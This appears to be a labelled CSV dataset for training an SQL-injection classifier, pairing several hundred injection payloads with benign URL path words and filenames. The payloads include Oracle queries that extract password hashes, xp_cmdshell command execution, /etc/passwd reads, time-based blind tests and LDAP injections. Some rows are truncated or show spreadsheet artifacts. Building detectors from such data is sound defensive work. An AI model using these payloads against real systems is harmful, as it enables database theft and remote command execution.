text,target
" AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
" AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
" AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
" AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
" AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
" AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
" AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
" AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
" AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
" AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
" AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
" AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
" AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
" AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
" AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
t15498,0
t15507,0
nt4lgscr,0
t15511,0
ntsrvtls,0
t15510,0
ntservpk,0
t1551,0
nt4stopc,0
admin' )  or  ( '1' = '1'/*,1
admin' )  or '1' = '1,1
admin' )  or '1' = '1'--,1
admin' )  or '1' = '1'#,1
admin' )  or '1' = '1'/*,1
"1234 ' AND 1 = 0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1
"admin"" --",1
"admin"" #",1
"admin""/*",1
"admin"" or ""1"" = ""1",1
"admin"" or ""1"" = ""1""--",1
"admin"" or ""1"" = ""1""#",1
"admin"" or ""1"" = ""1""/*",1
"admin""or 1 = 1 or """" = """,1
"admin"" or 1 = 1",1
"admin"" or 1 = 1--",1
"admin"" or 1 = 1#",1
"admin"" or 1 = 1/*",1
"admin"" )  or  ( ""1"" = ""1",1
"admin"" )  or  ( ""1"" = ""1""--",1
"admin"" )  or  ( ""1"" = ""1""#",1
"admin"" )  or  ( ""1"" = ""1""/*",1
"admin"" )  or ""1"" = ""1",1
"admin"" )  or ""1"" = ""1""--",1
"admin"" )  or ""1"" = ""1""#",1
"admin"" )  or ""1"" = ""1""/*",1
"1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
sqlvuln,1
#NAME?,1
sqlvuln;,1
( sqlvuln ),1
a' or 1 = 1--,1
"""a"""" or 1 = 1--""",1
or a  =  a,1
a' or 'a'  =  'a,1
1 or 1 = 1,1
a' waitfor delay '0:0:10'--,1
1 waitfor delay '0:0:10'--,1
declare @q nvarchar  ( 4000 )  select @q  =,1
0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,1
declare @s varchar ( 22 )  select @s  =,1
0x77616974666F722064656C61792027303A303A31302700 exec ( @s ),1
0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ),1
declare @s varchar  ( 8000 )  select @s  =  0x73656c65637420404076657273696f6e,1
exec ( @s ),1
a',1
?,1
or 1 = 1,1
‘ or 1 = 1 --,1
x' AND userid IS NULL; --,1
x' AND email IS NULL; --,1
anything' OR 'x' = 'x,1
x' AND 1 =  ( SELECT COUNT ( * )  FROM tabname ) ; --,1
x' AND members.email IS NULL; --,1
x' OR full_name LIKE '%Bob%,1
23 OR 1 = 1,1
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
or '' = ',1
or 'x' = 'x,1
or x = x,1
)  or  ( 'x' = 'x,1
0 or 1 = 1,1
or 0 = 0 --,1
""" or 0 = 0 --",1
or 0 = 0 --,1
or 0 = 0 #,1
" or 0 = 0 #""",1
or 0 = 0 #,1
or 1 = 1--,1
""" or 1 = 1--",1
or '1' = '1'--,1
or 1 --',1
or 1 = 1--,1
or 1 = 1,1
or 1 = 1 --,1
or 1 = 1 or '' = ',1
" or 1 = 1 or """" = ",1
or a = a--,1
or a = a,1
)  or  ( 'a' = 'a,1
)  or  ( a = a,1
hi or a = a,1
"hi or 1 = 1 --""",1
hi' or 1 = 1 --,1
hi' or 'a' = 'a,1
hi' )  or  ( 'a' = 'a,1
"""hi"""" )  or  ( """"a"""" = """"a""",1
hi' or 'x' = 'x';,1
@variable,1
",@variable",1
PRINT,1
PRINT @@variable,1
select,1
insert,1
as,1
or,1
procedure,1
limit,1
order by,1
asc,1
desc,1
delete,1
update,1
distinct,1
having,1
truncate,1
replace,1
like,1
handler,1
bfilename,1
or username like '%,1
or uname like '%,1
or userid like '%,1
or uid like '%,1
or user like '%,1
exec xp,1
exec sp,1
; exec master..xp_cmdshell,1
; exec xp_regread,1
t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
#NAME?,1
\x27UNION SELECT,1
UNION SELECT,1
UNION ALL SELECT,1
or  ( EXISTS ),1
( select top 1,1
||UTL_HTTP.REQUEST,1
1;SELECT *,1
to_timestamp_tz,1
tz_offset,1
"<>""'%; )  ( &+",1
or 1 = 1,1
%27 or 1 = 1,1
$ ( sleep 50 ),1
sleep 50',1
char%4039%41%2b%40SELECT,1
&apos; OR,1
sqlattempt1,1
( sqlattempt2 ),1
|,1
%7C,1
*|,1
%2A%7C,1
* ( | ( mail = *  )  ),1
%2A%28%7C%28mail%3D%2A%29%29,1
* ( | ( objectclass = *  )  ),1
%2A%28%7C%28objectclass%3D%2A%29%29,1
(,1
28%,1
),1
29%,1
&,1
26%,1
!,1
21%,1
or 1 = 1 or '' = ',1
or '' = ',1
x' or 1 = 1 or 'x' = 'y,1
/,1
//,1
//*,1
*/*,1
a' or 3 = 3--,1
"""a"""" or 3 = 3--""",1
or 3 = 3,1
‘ or 3 = 3 --,1
)  or  ( 'x' = 'x,1
or 1 = 1,1
; execute immediate 'sel' || 'ect us' || 'er',1
"benchmark ( 10000000,MD5 ( 1  )  )  #",1
update,1
""";waitfor delay '0:0:__TIME__'--",1
1 )  or pg_sleep ( __TIME__ ) --,1
"|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  ",1
"""hi"""" )  or  ( """"a"""" = """"a""",1
delete,1
like,1
""" or sleep ( __TIME__ ) #",1
pg_sleep ( __TIME__ ) --,1
* ( | ( objectclass = *  )  ),1
declare @q nvarchar  ( 200 )  0x730065006c00650063 ...,1
or 0 = 0 #,1
insert,1
1 )  or sleep ( __TIME__ ) #,1
)  or  ( 'a' = 'a,1
; exec xp_regread,1
*|,1
@var select @var as var into temp end --,1
"1  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #",1
asc,1
( ||6 ),1
"""a"""" or 3 = 3--""",1
""" or benchmark ( 10000000,MD5 ( 1  )  )  #",1
# from wapiti,1
or 0 = 0 --,1
1 waitfor delay '0:0:10'--,1
or 'a' = 'a,1
"hi or 1 = 1 --""",1
or a  =  a,1
UNION ALL SELECT,1
)  or sleep ( __TIME__ )  = ',1
"  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #",1
hi' or 'a' = 'a,1
0,1
21%,1
limit,1
or 1 = 1,1
or 2 > 1,1
"""  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #",1
PRINT,1
hi' )  or  ( 'a' = 'a,1
or 3 = 3,1
)  )  ;waitfor delay '0:0:__TIME__'--,1
a' waitfor delay '0:0:10'--,1
"1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...",1
or 1 = 1,1
1 or sleep ( __TIME__ ) #,1
or 1 = 1,1
and 1 in  ( select var from temp ) --,1
or '7659' = '7659,1
or 'text'  =  n'text',1
--,1
or 1 = 1 or '' = ',1
declare @s varchar  ( 200 )  select @s  =  0x73656c6 ...,1
exec xp,1
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
3.10E+17,1
""" or pg_sleep ( __TIME__ ) --",1
x' AND email IS NULL; --,1
&,1
admin' or ',1
or 'unusual'  =  'unusual',1
//,1
truncate,1
"1 )  or benchmark ( 10000000,MD5 ( 1  )  )  #",1
\x27UNION SELECT,1
declare @s varchar ( 200 )  select @s  =  0x77616974 ...,1
tz_offset,1
sqlvuln,1
"""  )  )  ;waitfor delay '0:0:__TIME__'--",1
||6,1
or 1 = 1 --,1
%2A%28%7C%28objectclass%3D%2A%29%29,1
or a = a,1
)  union select * from information_schema.tables;,1
PRINT @@variable,1
or isNULL ( 1/0 )  /*,1
26%,1
""" or ""a"" = ""a",1
( sqlvuln ),1
x' AND members.email IS NULL; --,1
or 1 = 1--,1
" and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,11 ...",1
0x770061006900740066006F0072002000640065006C00 ...,1
sleep 50',1
as,1
1  )  )   or pg_sleep ( __TIME__ ) --,1
/**/or/**/1/**/ = /**/1,1
union all select @@version--,1
",@variable",1
( sqlattempt2 ),1
or  ( EXISTS ),1
t'exec master..xp_cmdshell 'nslookup www.googl ...,1
$ ( sleep 50 ),1
"1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
or '' = ',1
||UTL_HTTP.REQUEST,1
or pg_sleep ( __TIME__ ) --,1
hi' or 'x' = 'x';,1
""" )  or sleep ( __TIME__ )  = """,1
or 'whatever' in  ( 'whatever' ),1
; begin declare @var varchar ( 8000 )  set @var = ' ...,1
" union select 1,load_file ( '/etc/passwd' ) ,1,1,1;",1
0x77616974666F722064656C61792027303A303A313027 ...,1
exec ( @s ),1
)  or pg_sleep ( __TIME__ ) --,1
union select,1
or sleep ( __TIME__ ) #,1
select * from information_schema.tables--,1
a' or 1 = 1--,1
a' or 'a'  =  'a,1
declare @s varchar ( 22 )  select @s  =,1
or 2 between 1 and 3,1
or a = a--,1
or '1' = '1,1
|,1
or sleep ( __TIME__ )  = ',1
or 1 --',1
"or 0 = 0 #""",1
having,1
a',1
""" or isNULL ( 1/0 )  /*",1
declare @s varchar  ( 8000 )  select @s  =  0x73656c ...,1
â or 1 = 1 --,1
char%4039%41%2b%40SELECT,1
order by,1
bfilename,1
having 1 = 1--,1
" )  or benchmark ( 10000000,MD5 ( 1  )  )  #",1
or username like char ( 37 ) ;,1
;waitfor delay '0:0:__TIME__'--,1
""" or 1 = 1--",1
x' AND userid IS NULL; --,1
*/*,1
or 'text' > 't',1
( select top 1,1
" or benchmark ( 10000000,MD5 ( 1  )  )  #",1
""" ) ;waitfor delay '0:0:__TIME__'--",1
a' or 3 = 3--,1
-- &password =,1
group by userid having 1 = 1--,1
or '' = ',1
; exec master..xp_cmdshell,1
or x = x,1
select,1
"""  )  )   or sleep ( __TIME__ )  = """,1
0x730065006c0065006300740020004000400076006500 ...,1
hi' or 1 = 1 --,1
""" )  or pg_sleep ( __TIME__ ) --",1
or 'x' = 'x,1
or 'something'  =  'some'+'thing',1
exec sp,1
29%,1
(,1
Ã½ or 1 = 1 --,1
1 or pg_sleep ( __TIME__ ) --,1
0 or 1 = 1,1
)  or  ( a = a,1
uni/**/on sel/**/ect,1
replace,1
%27 or 1 = 1,1
)  )   or pg_sleep ( __TIME__ ) --,1
%7C,1
x' AND 1 =  ( SELECT COUNT ( * )  FROM tabname ) ; --,1
&apos; OR,1
; or '1' = '1',1
declare @q nvarchar  ( 200 )  select @q  =  0x770061 ...,1
1 or 1 = 1,1
; exec  ( 'sel' + 'ect us' + 'er' ),1
23 OR 1 = 1,1
/,1
anything' OR 'x' = 'x,1
declare @q nvarchar  ( 4000 )  select @q  =,1
or 0 = 0 --,1
desc,1
||'6,1
),1
1  )  )   or sleep ( __TIME__ ) #,1
or 0 = 0 #,1
select name from syscolumns where id  =   ( sele ...,1
hi or a = a,1
* ( | ( mail = *  )  ),1
password:*/ = 1--,1
distinct,1
) ;waitfor delay '0:0:__TIME__'--,1
to_timestamp_tz,1
""" )  or benchmark ( 10000000,MD5 ( 1  )  )  #",1
UNION SELECT,1
%2A%28%7C%28mail%3D%2A%29%29,1
#NAME?,1
or 1 = 1 /*,1
)  )   or sleep ( __TIME__ )  = ',1
"or 1 = 1 or """" = ",1
or 1 in  ( select @@version ) --,1
sqlvuln;,1
union select * from users where login  =  char ...,1
x' or 1 = 1 or 'x' = 'y,1
28%,1
â or 3 = 3 --,1
@variable,1
or '1' = '1'--,1
"""a"""" or 1 = 1--""",1
//*,1
%2A%7C,1
""" or 0 = 0 --",1
"""  )  )   or pg_sleep ( __TIME__ ) --",1
?,1
or 1/*,1
!,1
or a  =  a,1
declare @q nvarchar  ( 200 )  select @q  =  0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec ( @q ),1
declare @s varchar ( 200 )  select @s  =  0x77616974666F722064656C61792027303A303A31302700 exec ( @s ),1
declare @q nvarchar  ( 200 )  0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ),1
declare @s varchar  ( 200 )  select @s  =  0x73656c65637420404076657273696f6e exec ( @s ),1
or 1 = 1,1
 or 1 = 1 --,1
x' OR full_name LIKE '%Bob%,1
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
or '' = ',1
or 'x' = 'x,1
)  or  ( 'x' = 'x,1
or 0 = 0 --,1
or 0 = 0 #,1
" or 0 = 0 #""",1
or 1 = 1--,1
or '1' = '1'--,1
or 1 --',1
or 1 = 1--,1
or 1 = 1 or '' = ',1
" or 1 = 1 or """" = ",1
or a = a--,1
or a = a,1
)  or  ( 'a' = 'a,1
hi' or 'x' = 'x';,1
or,1
procedure,1
handler,1
or username like '%,1
or uname like '%,1
or userid like '%,1
or uid like '%,1
or user like '%,1
; exec master..xp_cmdshell,1
; exec xp_regread,1
t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
#NAME?,1
UNION SELECT,1
UNION ALL SELECT,1
or  ( EXISTS ),1
( select top 1,1
||UTL_HTTP.REQUEST,1
1;SELECT *,1
"<>""'%; )  ( &+",1
or 1 = 1,1
sqlattempt1,1
28%,1
29%,1
26%,1
21%,1
or '' = ',1
or 3 = 3,1
or 3 = 3 --,1
Terms,0
reader,0
foundation,0
competitions,0
index8,0
hit,0
worms,0
notice,0
header2,0
car,0
prospective,0
kaspersky,0
cnet,0
nhl,0
voyeur,0
consumers,0
NASApp,0
regions,0
index10,0
index11,0
oem,0
close,0
auth,0
mature-sex,0
topright,0
label,0
embedded,0
web-hosting,0
learnmore,0
banking,0
club,0
big,0
scan,0
shadow,0
budget,0
icon_sad,0
icon_www,0
shoppingcart,0
typo3temp,0
Perl,0
virtual,0
card,0
Icons,0
grid,0
usb,0
outreach,0
Training,0
iso,0
region,0
Knowledgebase,0
guest,0
latex,0
act,0
orange,0
dsl,0
mailto,0
step1,0
page5,0
tab,0
PressReleases,0
organizations,0
master,0
Issues,0
favoriet,0
torrents,0
header_01,0
Blogs,0
real,0
Reference,0
aw,0
forgot_password,0
museum,0
bulletins,0
codes,0
fc,0
syndicate,0
direct,0
nsa,0
knowledge,0
israel,0
secretary,0
videoshow,0
gnu,0
camcorders,0
objects,0
latina,0
mars,0
unsubscribe,0
Staff,0
xp,0
ces,0
tapety,0
qmail,0
zoo,0
Printers,0
iss,0
ford,0
course,0
fees,0
materials,0
Common,0
Design,0
logo_phpBB,0
governance,0
fp,0
servlets,0
FrontPage,0
regulamin,0
comparison,0
Web,0
rus,0
ipchains,0
bookmarks,0
wlan,0
tongue,0
af,0
Tutorials,0
snapshots,0
en_US,0
sale,0
katalog,0
mc,0
gear,0
ids,0
rpg,0
atlas,0
result,0
am,0
amateur,0
view_profile,0
icon10,0
procmail,0
aff,0
lessons,0
ed,0
originalContent,0
worldsex,0
fax,0
index_10,0
howitworks,0
enigma,0
katrina,0
stocks,0
chicago,0
gold,0
index_11,0
off,0
Television,0
texis,0
manufacturing,0
description,0
backgrounds,0
Maps,0
posters,0
london,0
la,0
error,0
california,0
coupons,0
locator,0
Register,0
datasheets,0
horoscopes,0
m4,0
PythonPowered,0
sql,0
nature,0
esp,0
seminar,0
getacro,0
speech,0
attachments,0
outdoors,0
home1,0
russian,0
sk,0
solution,0
CP,0
infosec,0
li,0
zune,0
war,0
graph,0
piracy,0
Gallery,0
host,0
topleft,0
fisting,0
oss,0
police,0
filters,0
snort,0
Laptops,0
color,0
newspapers,0
il,0
gc,0
potd,0
suggest,0
tabid,0
fonts,0
zip,0
stock,0
operations,0
my1Up,0
brochure,0
artikel,0
dos,0
seal,0
calculator,0
guardian,0
credit,0
htdocs,0
valium,0
icon_razz,0
hdtv,0
terror,0
mortgage,0
screensavers,0
i1,0
soma,0
django,0
idea,0
baner,0
Topics,0
MP3,0
navbits_finallink,0
florida,0
gmail,0
vulnerabilities,0
spurl,0
guarantee,0
translate,0
explore,0
myguest,0
incest,0
earth,0
Weather,0
committees,0
cf,0
john,0
spain,0
rev,0
executive,0
tours,0
returns,0
mo,0
Skins,0
hacks,0
patch,0
hotlog,0
geo,0
flag_fr,0
transport,0
housing,0
Europe,0
arrow2,0
Photos,0
HomePage,0
dates,0
talkback,0
div,0
partnerships,0
popups,0
structure,0
texas,0
voice,0
university,0
sl,0
showpost,0
printthread,0
Album1,0
vc,0
director,0
ice,0
CHANGES,0
International,0
t2,0
jan,0
a3,0
Disclaimer,0
build,0
rankem,0
bf_new,0
campus,0
featuresIndex,0
vacation,0
button1,0
collaboration,0
scripting,0
ambien,0
sessions,0
monitors,0
newspaper,0
fac,0
Network,0
jokes,0
archiv,0
page6,0
suse,0
devices,0
beauty,0
snow,0
electronic,0
proceedings,0
prev,0
week,0
cnn,0
prog,0
e2,0
brochures,0
privacystatement,0
set,0
CA,0
b3,0
Profile,0
competition,0
dashboard,0
redesign,0
pki,0
sortIndex,0
pod,0
index_files,0
icon_home,0
smileys,0
nph-traceroute,0
centers,0
go_button,0
oral,0
cities,0
lat,0
speaker,0
Mail,0
viewer,0
binaries,0
updated,0
universal,0
ro,0
blonde,0
mailing,0
intranet,0
agb,0
index_12,0
past,0
newsfeed,0
userinfo,0
bguide,0
bbc,0
lt,0
eval,0
puzzle,0
snapshot,0
scat,0
pantyhose,0
ia,0
Servers,0
mast,0
index_13,0
word,0
index_09,0
internal,0
cats,0
graphs,0
image2,0
post_old,0
launch,0
bo,0
nic,0
sco,0
ml,0
hackers,0
americas,0
valid-rss,0
complaint,0
nero,0
bot,0
fish,0
l1,0
recruitment,0
passport,0
factsheets,0
utils,0
department,0
hc,0
Sitemap,0
cyber,0
teams,0
slideshows,0
rsa,0
printing,0
constitution,0
views,0
RSA-336x280,0
colocation,0
david,0
publisher,0
icom,0
customize,0
imprint,0
seattle,0
howtos,0
publishing,0
rssfeeds,0
Autos,0
numbers,0
w3c,0
certificate,0
study,0
frameset,0
calendars,0
sep,0
tax,0
recreation,0
medium,0
person,0
s3,0
loan,0
mailer,0
bottom_right,0
lipitor,0
clips,0
newsarchive,0
studies,0
pgpkey,0
mailing-lists,0
reading,0
Wireless,0
cinema,0
globe,0
smiley,0
warranty,0
ls,0
Pets,0
re,0
where,0
datacenter,0
quicktime,0
smart,0
button2,0
Corporate,0
logo_top,0
rssLanding,0
girls,0
img2,0
platforms,0
tm,0
one,0
donation,0
icon9,0
announcement,0
tg,0
header_02,0
Fitness,0
trust,0
oferta,0
spacer2,0
none,0
fm,0
ww,0
d2,0
grad,0
vendors,0
insight,0
stable,0
linkus,0
Catalog,0
adinfo,0
elearning,0
Buttons,0
transcripts,0
wedding,0
pornstar,0
speaking,0
pregnant,0
badges,0
intelligence,0
xhtml,0
artist,0
myyahoo,0
alt,0
meeting,0
yahoomyweb,0
trojan,0
gray,0
Backup,0
invest,0
offer,0
nw,0
euro,0
aix,0
call,0
somerights20,0
soa,0
NR,0
e-commerce,0
cpu,0
satellite,0
artykuly,0
icon6,0
month,0
controller,0
des,0
spanking,0
like,0
medicine,0
contatti,0
publication,0
ff,0
explorer,0
scams,0
pee,0
xmas,0
boxes,0
spy,0
Communications,0
mexico,0
mcafee,0
n1,0
gsm,0
multi,0
slots,0
messaging,0
vicodin,0
year,0
femdom,0
captcha,0
tmp,0
g1,0
DVD,0
Reports,0
dp,0
blogcategory,0
galeria,0
pi,0
ssi,0
ae,0
rank,0
immigration,0
entries,0
attack,0
station,0
newswire,0
_img,0
abc,0
anime,0
ent,0
calc,0
soap,0
bus,0
header_left,0
vacancies,0
tpl,0
Google,0
oldnews,0
_archives,0
VoIP,0
listing,0
legacy,0
dr,0
portals,0
index12,0
trojans,0
LICENSE,0
fishing,0
cracks,0
dyn,0
lab,0
macintosh,0
usercp,0
indian,0
ita,0
he,0
contact_off,0
poweredby,0
cellphones,0
epic,0
bridge,0
west,0
insider,0
favorites,0
auctions,0
as,0
Conferences,0
md5,0
backissues,0
pandora,0
pagerank,0
integration,0
drm,0
t3,0
cda,0
diy,0
menus,0
rock,0
digitalcameras,0
netware,0
ic,0
Gifts,0
language_tools,0
remove,0
cheats,0
Satellite,0
nmap,0
gry,0
brands,0
arc,0
cal,0
FindPage,0
PHP,0
save,0
usatoday,0
index_16,0
plat,0
lines,0
separator,0
v3,0
physics,0
tits,0
wired,0
web-design,0
login_form,0
index_17,0
bill,0
vmware,0
Development,0
ufo,0
weekend,0
italian,0
hipaa,0
cable,0
strapon,0
minus,0
icon3,0
nuke,0
noscript,0
creampie,0
cheerleaders,0
ci,0
icon_rss,0
threats,0
repository,0
webcams,0
prodinfo,0
sudoku,0
folder_announce,0
words,0
day,0
plans,0
censorship,0
auction,0
zh-cn,0
migration,0
howtobuy,0
risk,0
Finance,0
protocols,0
logon,0
drunk-girls,0
cartoon,0
Contact_Us,0
Anti-Virus,0
breakingnews,0
header_right,0
mld,0
briefs,0
ag,0
iran,0
index20,0
IT,0
linkto,0
ai,0
write,0
index-en,0
referral,0
hp2,0
slackware,0
actions,0
final,0
biometrics,0
rainbow,0
hi,0
cancer,0
art1,0
mastercard,0
svg,0
monitoring,0
statement,0
mail_icon,0
mt-comments,0
s4,0
korea,0
weddings,0
bug,0
point,0
cam,0
about_off,0
bestsellers,0
carisoprodol,0
Banners,0
sed,0
nc,0
buyers_guide,0
distribution,0
translations,0
express,0
patent,0
speed,0
rule,0
email_icon,0
fo,0
eclipse,0
lectures,0
record,0
Registration,0
evolution,0
ethereal,0
bf,0
vps,0
flag_en,0
suche,0
bubble,0
permissions,0
rdonlyres,0
phreak,0
bylaws,0
pierced,0
depts,0
note,0
twiki,0
page7,0
example,0
layouts,0
hd,0
newsy,0
shem,0
htm,0
b4,0
folder_hot,0
c3,0
vietnam,0
sci,0
anoncvs,0
jpg,0
its,0
newyork,0
athletics,0
winners,0
termsofservice,0
az,0
Desktops,0
op,0
p3,0
modern,0
rs,0
Ads,0
imagenes,0
Flowers,0
switch,0
myAccount,0
s2,0
imghp,0
techsupport,0
dicks,0
ddl,0
Encryption,0
WebObjects,0
Storage,0
meter,0
tree,0
finalmark,0
openssl,0
_themes,0
economics,0
Current_events,0
home_on,0
pls,0
merchandise,0
but,0
cb,0
nintendo,0
inside,0
a5,0
Pictures,0
Feedback,0
ipv6,0
shemale-sex,0
arrow_down,0
amd,0
heroes,0
pantyhose-sex,0
ping,0
ZDelete_3,0
YearPlanner_v1,0
X-NetStat_5,0
X-NetStat_3,0
Warenwirtschaft_v7,0
WashAndGo_v7,0
VbWizards_v1,0
RadioSpy_1,0
RadioRipper_2,0
X-Split_v1,0
vBuild_v2,0
X-Ripper_v4,0
X-Plane_v8,0
Radio2MP3_v1,0
X-NetStat_v5,0
WarpNote_1,0
WarrenView_v1,0
X-Ray_3,0
VbsEdit_v2,0
S-HOAI_4,0
S-Control_3,0
Tab2Desk_v2,0
Pam_v1,0
U-Wipe_v1,0
Nchtonegeneratorv_2,0
U-Wipe_2,0
TabBook_v3,0
T-Mail_v1,0
T-Taches_1,0
U-Wipe_v2,0
V3mail_v1,0
V3mail_1,0
TabMail_1,0
V41,0
Pandorado_v3,0
Saavor_v2,0
Pandamonium_v1,0
NCSFinCalculatorsXP_v1,0
Paminnaren_v4,0
uAnimator_v1,0
w-IP_v1,0
s25atonce_v2,0
JExeCreator_v1,0
Jexecreator_1,0
LaunchPad_v3,0
PalmaryClock_v3,0
JewlLinr_2,0
PalmaryCalc_v1,0
JewelBox_v4,0
Jewelbox_v4,0
Laufwerkverwaltung_v1,0
NavStation_v2,0
Palmaryclock_1,0
Palmaryclock_2,0
Jewels_v2,0
Palmekg_v1,0
R-Excel_1,0
Palmjpegwatch_1,0
R-Mail_1,0
Ncftpd_v2,0
Palmarydatesv_1,0
Palmarydates_1,0
Palmaryclockscreensaverv_2,0
WALLAP_V5,0
Tagrename_3,0
Tagrename3,0
TagRename_v3,0
Walldrobe_v3,0
TagRename_v2,0
WallChanger_v2,0
TagRename_3,0
Tagarela_1,0
SafeHouse_2,0
SafeHack_v1,0
Yahee_v1,0
SafeGuardOne_v2,0
TagWorks_v2,0
Tai-Pan2MetaStock_v1,0
SafeHouse_v2,0
SafeBit_v1,0
Tagebuch_v2004,0
Safe4Win_v1,0
Yager_v5,0
SafeCrypt_v2,0
SAD,0
TabTrax_v1,0
PaneKiller_v1,0
Tabrowser_v2,0
Wagez_v1,0
Tac32Plus_2,0
Tabrowser_v1,0
NCT_2000,0
TabPlayer,0
